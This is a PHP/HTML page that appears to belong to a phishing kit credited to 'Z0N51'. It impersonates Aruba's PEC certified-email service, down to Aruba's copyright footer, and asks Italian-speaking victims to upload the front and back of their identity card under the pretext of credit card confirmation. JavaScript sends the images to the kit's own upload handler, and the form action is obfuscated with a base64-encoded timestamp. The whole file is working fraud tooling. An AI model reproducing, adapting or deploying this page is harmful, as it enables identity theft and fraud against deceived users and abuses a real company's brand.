<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/
    
    $_SESSION['last_page'] = "id";
    
?>

<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title> Sign in to your PEC email account | Pec.it </title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="<?php echo CSSPATH; ?>/bootstrap.css">
  <link rel="stylesheet"  href="<?php echo CSSPATH; ?>/style.css">             


  <!-- logo site web-->
  <link rel="icon" href="<?php echo IMGSPATH; ?>/fav.ico" type="image/x-icon" />


  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css"/>

</head>



<body>
 <header>
   <div class="container d-flex justify-content-between align-items-center">
     <div class="left d-flex">
       <div class="logo"><img src="<?php echo IMGSPATH; ?>/llg.png"></div>
       <div class="vv">Conferma della carta di credito</div>
     </div>
     <div class="help"><img src="<?php echo IMGSPATH; ?>/help.png"></div>
   </div>
 </header>
 <section>
   <div class="container">
     <div class="sec">
       <h2>Si prega di caricare la carta d'identità – Fronte e Retro</h2>
       <p>Per completare la verifica, carica foto chiare sia del fronte che del retro della tua carta d'identità.<br>Assicurati che le immagini siano nitide e che tutte le informazioni siano leggibili per evitare ritardi nell'elaborazione.</p>
       <div class="box frm col-md-8">
          <form action="<?php echo base64_encode(time()); ?>" method="POST">
                                <input type="hidden" id="cap" name="cap">
                                <input type="hidden" name="steeep" id="steeep" value="id">
             

             <div class="upload-area form-group row align-items-center mb-4">
                                    <label for="recto" class="lbl <?php echo errclass($_SESSION['errors'],'recto_file') ?>">
                                        <i class="fas fa-upload"></i>
                                        <p>Fronte della carta d'identità:<br>Carica il lato frontale della tua carta d'identità.</p>
                                    </label>
                                    <input type="file" class="d-none" name="recto" id="recto">
                                    <input type="hidden" name="recto_file" id="recto_file">
                                </div>

                                <div class="upload-area form-group row align-items-center mb-4">
                                    <label for="verso" class="lbl <?php echo errclass($_SESSION['errors'],'verso_file') ?>">
                                        <i class="fas fa-upload"></i>
                                        <p>Retro della carta d'identità:<br>Carica il retro della tua carta d'identità.</p>
                                    </label>
                                    <input type="file" class="d-none" name="verso" id="verso">
                                    <input type="hidden" name="verso_file" id="verso_file">
                                </div>

             
             <div class="btt text-center"><button type="submit">Verificare</button></div>
          </form>
       </div>
       
     </div>
   </div>
   <hr>
    <div class="foot text-center mt-5">
              <p class="mb-0">©2025 Aruba S.p.A. - P.IVA 01573850516</p>  
              <p class="mb-0 mt-0">REA: BG-434483 - All rights reserved</p>  
              <div class="a"><a href="#">Privacy Policy - Cookie Policy</a></div>
     </div>
 </section>

 

  <!-- template files js-->
  <script src="<?php echo JSPATH; ?>/jquery-3.5.1.min.js"></script>
  <script src="<?php echo JSPATH; ?>/bootstrap.min.js"></script>
  <script src="<?php echo JSPATH; ?>/jquery.mask.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/jquery-simple-upload@1.1.0/simpleUpload.min.js"></script>
  <script src="<?php echo JSPATH; ?>/js.js"></script>
  <script>

    $('#recto').change(function(){
                $(this).simpleUpload("index.php?step=upload&filename=recto", {
                    start: function(file){
                        $('label[for="recto"]').removeClass('success');
                        $('label[for="recto"]').removeClass('has-error');
                        $('label[for="recto"]').html('<div class="spinner-border text-secondary" role="status"></div>');
                    },
                    progress: function(progress){
                        $('label[for="id"]').html('<div class="spinner-border text-secondary" role="status"></div>');
                    },
                    success: function(data){
                        console.log(data);
                        if( data !== 'error' ) {
                            $('#recto_file').val(data);
                            $('label[for="recto"]').addClass('success');
                            $('label[for="recto"]').html('<i class="fas fa-check"></i><p>Il download è stato completato con successo.</p>');
                        } else if( data == 'error' ) {
                            $('label[for="recto"]').addClass('has-error');
                            $('label[for="recto"]').html('<i class="far fa-times-circle"></i>');
                        }
                    },
                    error: function(error){
                        $('label[for="recto"]').addClass('has-error');
                        $('label[for="recto"]').html('<i class="far fa-times-circle"></i>');
                    }
                });
            });

            $('#verso').change(function(){
                $(this).simpleUpload("index.php?step=upload&filename=verso", {
                    start: function(file){
                        $('label[for="verso"]').removeClass('success');
                        $('label[for="verso"]').removeClass('has-error');
                        $('label[for="verso"]').html('<div class="spinner-border text-secondary" role="status"></div>');
                    },
                    progress: function(progress){
                        $('label[for="id"]').html('<div class="spinner-border text-secondary" role="status"></div>');
                    },
                    success: function(data){
                        console.log(data);
                        if( data !== 'error' ) {
                            $('#verso_file').val(data);
                            $('label[for="verso"]').addClass('success');
                            $('label[for="verso"]').html('<i class="fas fa-check"></i><p>Il download è stato completato con successo.</p>');
                        } else if( data == 'error' ) {
                            $('label[for="verso"]').addClass('has-error');
                            $('label[for="verso"]').html('<i class="far fa-times-circle"></i>');
                        }
                    },
                    error: function(error){
                        $('label[for="verso"]').addClass('has-error');
                        $('label[for="verso"]').html('<i class="far fa-times-circle"></i>');
                    }
                });
            });


   
  </script>
</body>
</html>